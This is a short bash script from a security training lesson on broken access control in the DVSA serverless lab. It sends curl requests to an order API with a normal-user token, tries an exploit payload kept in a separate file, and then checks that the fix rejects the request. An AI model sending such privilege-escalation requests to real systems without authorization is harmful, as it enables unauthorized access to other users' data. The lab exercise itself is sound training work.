#!/usr/bin/env bash

# Lesson 5 - Broken Access Control curl commands
# Use only in the authorized DVSA lab environment.
# Replace <normal_user_token> with a fresh normal-user Authorization token.

export API="https://d0xsecb8a2.execute-api.us-east-1.amazonaws.com/dvsa/order"
export AUTH="<normal_user_token>"

# 1) Check normal order state before exploitation
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $AUTH" \
  --data @payloads/check_orders_payload.json | jq

# 2) Attempt the broken access control exploit
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $AUTH" \
  --data @payloads/admin_update_exploit_payload.json | jq

# 3) Re-run this same request after the fix. Expected response:
# {"status":"err","msg":"Unauthorized"}
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $AUTH" \
  --data @payloads/post_fix_verification_payload.json | jq
